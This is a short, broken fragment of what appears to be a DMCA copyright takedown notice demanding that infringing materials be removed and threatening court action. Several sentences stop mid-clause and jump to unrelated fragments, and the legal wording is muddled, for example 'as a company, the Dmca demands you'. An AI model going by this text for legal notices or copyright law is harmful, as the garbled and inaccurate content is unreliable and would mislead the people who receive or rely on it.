I do believe you have willfully violated our legal rights under 17 USC

the elimination of the infringing materials described above. Please be
aware as a company, the Dmca demands you to eliminate or/and
deactivate access to the infringing materials upon receipt of this
notice. If you don't stop the utilization of the previously mentioned
copyrighted materials a court action will likely be started against
you. I have a good belief that utilization of the copyrighted

the copyright owner, its agent, as well as law. I declare, under
